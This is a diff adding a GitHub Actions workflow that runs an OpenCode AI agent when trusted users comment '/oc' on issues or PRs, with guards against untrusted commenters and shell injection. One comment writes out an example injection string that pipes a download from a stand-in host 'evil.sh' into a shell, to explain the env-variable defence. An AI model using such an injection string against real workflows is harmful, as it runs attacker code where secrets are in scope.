@@ -1,0 +1,74 @@
+# Copy to <app>/.github/workflows/opencode.yml
+#
+# Prompt from your phone by commenting on any issue or PR in the GitHub app:
+#     /oc add a dark mode toggle to SecurityActivity
+#     /oc model=anthropic/claude-opus-5 fix the crash when a profile has no apps
+#
+# NEVER add this workflow to a public repo. A public repo plus a comment trigger
+# means a stranger can run your agent on your OpenRouter key.
+
+name: opencode
+
+on:
+  issue_comment:
+    types: [created]
+  pull_request_review_comment:
+    types: [created]
+
+permissions:
+  contents: write
+  pull-requests: write
+  issues: write
+  id-token: write   # the action exchanges an OIDC token for an OpenCode App token
+
+jobs:
+  agent:
+    # Two guards, both load-bearing:
+    #  - author_association stops anyone who can comment from burning your key
+    #  - startsWith with a trailing space avoids matching /octopus, doc/ocean,
+    #    or any URL containing "/oc", which plain contains() would
+    if: >
+      (github.event.comment.author_association == 'OWNER' ||
+       github.event.comment.author_association == 'MEMBER' ||
+       github.event.comment.author_association == 'COLLABORATOR')
+      && (startsWith(github.event.comment.body, '/oc ') ||
+          startsWith(github.event.comment.body, '/opencode ') ||
+          github.event.comment.body == '/oc' ||
+          github.event.comment.body == '/opencode')
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Parse requested model
+        id: parse
+        env:
+          # Via env, never interpolated into the script body. A comment reading
+          #   "; curl evil.sh | sh; #
+          # would otherwise execute on the runner with your secrets in scope.
+          BODY: ${{ github.event.comment.body }}
+          DEFAULT_MODEL: openrouter/anthropic/claude-sonnet-5
+        run: |
+          set -euo pipefail
+          MODEL="$(printf '%s' "$BODY" \
+            | grep -oiE '(^|[[:space:]])model=[A-Za-z0-9._/@:-]+' \
+            | head -1 | sed -E 's/.*model=//' || true)"
+
+          # The character allowlist above is what neutralises injection even
+          # through the GITHUB_OUTPUT path.
+          case "$MODEL" in
+            openrouter/*) ;;                       # already fully qualified
+            */*) MODEL="openrouter/$MODEL" ;;      # "anthropic/claude-opus-5" -> prefix it
+            *) MODEL="$DEFAULT_MODEL" ;;
+          esac
+
+          echo "model=$MODEL" >> "$GITHUB_OUTPUT"
+          echo "using model: $MODEL"
+
+      - uses: anomalyco/opencode/github@latest
+        env:
+          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
+        with:
+          model: ${{ steps.parse.outputs.model }}
+          share: 'false'   # private repo - never publish the session
